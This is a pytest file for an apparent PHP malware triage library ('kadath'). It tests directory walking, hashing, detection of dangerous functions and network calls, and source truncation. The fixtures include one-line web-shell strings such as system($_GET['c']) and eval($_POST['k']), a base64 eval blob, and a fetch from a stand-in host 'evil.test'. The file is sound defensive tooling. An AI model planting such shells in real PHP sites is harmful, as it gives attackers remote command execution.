import base64
import os
from kadath import library


def _mk(tmp_path, cid, files):
    d = tmp_path / cid
    d.mkdir()
    for name, body in files.items():
        (d / name).write_text(body)
    return d


def test_walk_classifies_cases(tmp_path):
    _mk(tmp_path, "FIO-2", {"a.php": "<?php echo 1;", "README.md": "# FIO-2\nBulk import from X\n"})
    _mk(tmp_path, "FIO-1", {"a.php": "<?php", "b.php": "<?php"})
    _mk(tmp_path, "FIO-3", {"x.html": "<b>"})
    _mk(tmp_path, "FIO-4", {"s.PHP": "<?php"})
    (tmp_path / "kadath-triage.csv").write_text("")
    (tmp_path / ".hidden").mkdir()
    cases = library.walk(str(tmp_path))
    assert [c.id for c in cases] == ["FIO-1", "FIO-2", "FIO-3", "FIO-4"]
    by = {c.id: c for c in cases}
    assert by["FIO-1"].skip_reason == "multi-file" and by["FIO-1"].php is None
    assert by["FIO-2"].skip_reason is None and by["FIO-2"].php.endswith("a.php")
    assert by["FIO-2"].readme.endswith("README.md")
    assert by["FIO-3"].skip_reason == "no-php"
    assert by["FIO-4"].skip_reason is None and by["FIO-4"].php.endswith("s.PHP")


def test_provenance(tmp_path):
    r = tmp_path / "README.md"
    r.write_text("# Title\n\nBulk import from WordFence, original directory x\n\nSkipped: y\n")
    assert library.provenance(str(r)) == "Bulk import from WordFence, original directory x"
    assert library.provenance(str(tmp_path / "missing")) == ""


def test_static_facts(tmp_path):
    blob = base64.b64encode(os.urandom(300)).decode()
    src = ("<?php\n$u = wp_create_user('a','b');\nadd_action('init', 'f');\n"
           f"eval(base64_decode('{blob}'));\nsystem($_GET['c']);\n"
           "$r = wp_remote_get('http://x');\ncurl_init();\n")
    p = tmp_path / "s.php"
    p.write_text(src)
    f = library.static_facts(str(p))
    assert len(f["sha256"]) == 64 and len(f["sha1"]) == 40 and len(f["md5"]) == 32
    assert f["size"] == len(src.encode()) and f["lines"] == 7
    assert f["dangerous"]["eval"] == 1 and f["dangerous"]["base64_decode"] == 1 and f["dangerous"]["system"] == 1
    assert f["wp_api"] == ["add_action", "wp_create_user", "wp_remote_get"]
    assert f["network"] == ["curl_init", "wp_remote_get"]
    assert f["has_blob"] is True and f["longest_literal"] >= 300
    assert 4.0 < f["entropy"] < 8.0
    plain = tmp_path / "p.php"
    plain.write_text("<?php\necho 'hi';\n")
    g = library.static_facts(str(plain))
    assert g["dangerous"] == {} and g["wp_api"] == [] and g["has_blob"] is False


def test_source_view_numbered_and_truncated(tmp_path):
    p = tmp_path / "s.php"
    p.write_text("<?php\necho 1;\n")
    text, trunc = library.source_view(str(p))
    assert text == "1| <?php\n2| echo 1;" and trunc is False

    lines = ["<?php"] + [f"$x{i} = 'filler filler filler';" for i in range(2000)]
    lines[1000] = "eval($_POST['k']);"
    big = tmp_path / "big.php"
    big.write_text("\n".join(lines) + "\n")
    text, trunc = library.source_view(str(big), limit=20000, head=4000, tail=2000)
    assert trunc is True
    assert text.startswith("1| <?php")
    assert "1001| eval($_POST['k']);" in text
    assert "2001| $x1999" in text
    assert "[lines " in text and "omitted]" in text
    assert "500| $x498" not in text


def test_case_insensitive_function_matching(tmp_path):
    """PHP function names are case-insensitive; test that uppercase variations are detected."""
    src = ("<?php\n"
           "SYSTEM($_GET['c']);\n"
           "Eval(base64_decode('x'));\n"
           "CURL_INIT();\n"
           "WP_Create_User('a','b');\n")
    p = tmp_path / "mixed_case.php"
    p.write_text(src)
    f = library.static_facts(str(p))
    assert f["dangerous"]["system"] == 1
    assert f["dangerous"]["eval"] == 1
    assert f["dangerous"]["base64_decode"] == 1
    assert f["network"] == ["curl_init"]
    assert f["wp_api"] == ["wp_create_user"]

    # Test truncation preserves uppercase dangerous functions in source_view
    lines = ["<?php"] + ["filler"] * 5000 + ["SYSTEM($_GET['cmd']);"] + ["filler"] * 5000
    big = tmp_path / "big_upper.php"
    big.write_text("\n".join(lines))
    text, trunc = library.source_view(str(big), limit=20000, head=4000, tail=2000)
    assert trunc is True
    assert "SYSTEM(" in text


def test_hidden_dirs_in_walk(tmp_path):
    """Hidden directories (.git, .cache) containing PHP should not cause multi-file classification."""
    case_dir = tmp_path / "FIO-100"
    case_dir.mkdir()
    (case_dir / "s.php").write_text("<?php echo 1;")
    git_dir = case_dir / ".git" / "hooks"
    git_dir.mkdir(parents=True)
    (git_dir / "x.php").write_text("<?php")

    cases = library.walk(str(tmp_path))
    by = {c.id: c for c in cases}
    assert by["FIO-100"].skip_reason is None
    assert by["FIO-100"].php.endswith("s.php")


def test_empty_php_file(tmp_path):
    """Empty PHP file should return expected zero values."""
    p = tmp_path / "empty.php"
    p.write_text("")
    f = library.static_facts(str(p))
    assert f["size"] == 0
    assert f["lines"] == 0
    assert f["entropy"] == 0.0
    assert f["has_blob"] is False
    text, truncated = library.source_view(str(p))
    assert text == ""
    assert truncated is False


def test_non_utf8_bytes(tmp_path):
    """File with non-UTF-8 bytes should decode with replace and not raise."""
    p = tmp_path / "binary.php"
    p.write_bytes(b"<?php\n\xff\xfe echo 1;\n")
    f = library.static_facts(str(p))
    assert f["lines"] == 2
    text, _ = library.source_view(str(p))
    assert "1| <?php" in text
    assert "2| " in text


def test_network_needs_url_for_file_readers(tmp_path):
    local = tmp_path / "local.php"
    local.write_text("<?php\n$c = file_get_contents(__DIR__.'/cache.txt');\n$h = fopen('log.txt','a');\n")
    assert library.static_facts(str(local))["network"] == []
    remote = tmp_path / "remote.php"
    remote.write_text("<?php\n$c = file_get_contents('https://evil.test/x');\n")
    assert library.static_facts(str(remote))["network"] == ["file_get_contents"]
    sock = tmp_path / "sock.php"
    sock.write_text("<?php\n$s = fsockopen('1.2.3.4', 6667);\ncurl_init();\n")
    assert library.static_facts(str(sock))["network"] == ["curl_init", "fsockopen"]


def test_wants_wordpress(tmp_path):
    for body, want in (("<?php add_action('init','f');", True), ("<?php if (!defined('ABSPATH')) exit;", True),
                       ("<?php global $wpdb; $wpdb->get_var('x');", True), ("<?php new WP_Error('x');", True),
                       ("<?php eval($_POST['k']);", False), ("<?php echo 'hi';", False),
                       ("<?php if (is_robots()) exit;", True), ("<html><?php language_attributes(); ?>", True),
                       ("<?php Get_Option('x');", True), ("<?php echo __('hi');", True)):
        p = tmp_path / "s.php"
        p.write_text(body)
        assert library.wants_wordpress(str(p)) is want, body
    assert library.wants_wordpress(str(tmp_path / "missing.php")) is False


def test_walk_ignores_our_kadath_output_dir(tmp_path):
    d = tmp_path / "FIO-1"; d.mkdir()
    (d / "s.php").write_text("<?php echo 1;")
    unp = d / "kadath" / "unpacked"; unp.mkdir(parents=True)
    (unp / "layer-1.php").write_text("<?php system($_GET['c']);")   # runes output, not a sample
    (d / "kadath" / "runes.json").write_text("{}")
    case = [c for c in library.walk(str(tmp_path)) if c.id == "FIO-1"][0]
    assert case.skip_reason is None and case.php.endswith("s.php")


def test_walk_keeps_a_sample_in_a_nested_dir_named_kadath(tmp_path):
    # a sample archived under its own subdir literally named "kadath" (not our
    # output at the case root) must still be found
    d = tmp_path / "FIO-2"; (d / "vendor" / "kadath").mkdir(parents=True)
    (d / "vendor" / "kadath" / "shell.php").write_text("<?php system($_GET['c']);")
    case = [c for c in library.walk(str(tmp_path)) if c.id == "FIO-2"][0]
    assert case.php is not None and case.php.endswith("shell.php") and case.skip_reason is None
